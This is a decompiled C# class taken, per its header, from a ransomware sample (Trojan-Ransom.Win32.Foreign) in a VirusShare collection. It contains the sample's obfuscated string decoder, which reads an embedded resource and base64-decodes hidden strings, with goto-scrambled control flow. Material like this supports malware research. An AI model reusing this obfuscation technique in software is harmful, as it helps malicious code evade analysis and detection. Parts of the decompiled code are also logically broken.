// Decompiled with JetBrains decompiler
// Type: .
// Assembly: NclMSBTSrv, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: D4E46E7B-1FBA-4F29-81C4-3377C9B80C35
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Foreign.mwkm-9c56108885d6f13424ebbcebd57b85bfe387b84cb89af8139018fddf9ee26b17.exe

using \u0004;
using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0002
{
  internal class \u0002
  {
    private static readonly string \u0001;
    private static readonly string \u0002;
    private static readonly byte[] \u0001;
    private static readonly Hashtable \u0001;
    private static readonly bool \u0001;
    private static readonly int \u0001;

    public static string \u0001([In] int obj0)
    {
      int index1;
      int num1;
      int count;
      do
      {
        int num2 = obj0;
        int num3;
        while (true)
        {
          int num4 = \u0002.\u0002.\u0001;
          int num5 = num2 - num4;
          if (true)
            goto label_29;
label_2:
          while (\u0002.\u0002.\u0001)
          {
            string str1 = (string) \u0002.\u0002.\u0001[(object) obj0];
            if (true)
              goto label_30;
label_4:
            string str2;
            if (str2 != null)
            {
              if (true)
                return str2;
              continue;
            }
            break;
label_30:
            str2 = str1;
            goto label_4;
          }
          if (true)
            goto label_31;
label_8:
          int num6 = obj0;
          if (true)
            goto label_32;
label_9:
          byte[] numArray = \u0002.\u0002.\u0001;
          int index2 = index1;
          int num7 = index2 + 1;
          if (true)
            goto label_33;
label_10:
          int num8 = (int) numArray[index2];
          if (true)
            goto label_34;
label_11:
          num3 = num1 & 128;
          if (false)
          {
            num2 = num3;
            continue;
          }
          break;
label_34:
          num1 = num8;
          goto label_11;
label_33:
          index1 = num7;
          goto label_10;
label_32:
          index1 = num6;
          goto label_9;
label_31:
          goto label_8;
label_29:
          obj0 = num5;
          goto label_2;
        }
        if (num3 == 0)
        {
          count = num1;
          if (count != 0)
            goto label_23;
        }
        else
          goto label_16;
      }
      while (false);
      return string.Empty;
label_16:
      if ((num1 & 64) == 0)
      {
        int num9 = num1 & 63;
        if (true)
          num9 <<= 8;
        int num10 = (int) \u0002.\u0002.\u0001[index1++];
        count = num9 + num10;
      }
      else
      {
        int num11 = (num1 & 31) << 24;
        byte[] numArray1 = \u0002.\u0002.\u0001;
        int index3 = index1;
        int num12 = index3 + 1;
        int num13 = (int) numArray1[index3];
        if (true)
        {
          int num14 = num13 << 16;
          int num15 = num11 + num14;
          num13 = (int) \u0002.\u0002.\u0001[num12++];
          num11 = num15;
        }
        int num16 = num13 << 8;
        int num17 = num11 + num16;
        byte[] numArray2 = \u0002.\u0002.\u0001;
        int index4 = num12;
        index1 = index4 + 1;
        int num18 = (int) numArray2[index4];
        count = num17 + num18;
      }
label_23:
      try
      {
        byte[] bytes = Convert.FromBase64String(Encoding.UTF8.GetString(\u0002.\u0002.\u0001, index1, count));
        string str = string.Intern(Encoding.UTF8.GetString(bytes, 0, bytes.Length));
        if (\u0002.\u0002.\u0001)
        {
          try
          {
            \u0002.\u0002.\u0001.Add((object) obj0, (object) str);
          }
          catch
          {
          }
        }
        return str;
      }
      catch
      {
        return (string) null;
      }
    }

    static \u0002()
    {
      if (true)
        \u0002.\u0002.\u0001 = "1";
      else
        goto label_3;
label_2:
      \u0002.\u0002.\u0002 = "149";
      \u0002.\u0002.\u0001 = (byte[]) null;
      \u0002.\u0002.\u0001 = (Hashtable) null;
      \u0002.\u0002.\u0001 = false;
label_3:
      if (true)
      {
        \u0002.\u0002.\u0001 = 0;
        do
        {
          if (\u0002.\u0002.\u0001 == "1")
          {
            \u0002.\u0002.\u0001 = true;
            \u0002.\u0002.\u0001 = new Hashtable();
          }
          \u0002.\u0002.\u0001 = Convert.ToInt32(\u0002.\u0002.\u0002);
          Assembly executingAssembly = Assembly.GetExecutingAssembly();
          if (true)
            goto label_23;
label_8:
          Assembly assembly;
          Stream manifestResourceStream = assembly.GetManifestResourceStream("{df273daa-7baf-4a07-ae82-9fc4b17d3702}");
          if (true)
            goto label_24;
label_9:
          Stream stream1;
          try
          {
            int int32 = Convert.ToInt32(stream1.Length);
            if (true)
              goto label_14;
label_10:
            int count;
            byte[] numArray = new byte[count];
            if (true)
              goto label_15;
label_11:
            byte[] buffer;
            stream1.Read(buffer, 0, count);
            \u0002.\u0002.\u0001 = \u0005.\u0001(buffer);
            if (true)
              goto label_16;
label_12:
            Stream stream2 = stream1;
            if (true)
            {
              stream2.Close();
              goto label_22;
            }
            else
              goto label_22;
label_16:
            buffer = (byte[]) null;
            goto label_12;
label_15:
            buffer = numArray;
            goto label_11;
label_14:
            count = int32;
            goto label_10;
          }
          finally
          {
            do
            {
              stream1?.Dispose();
            }
            while (false);
          }
label_22:
          continue;
label_24:
          stream1 = manifestResourceStream;
          goto label_9;
label_23:
          assembly = executingAssembly;
          goto label_8;
        }
        while (false);
      }
      else
        goto label_2;
    }
  }
}
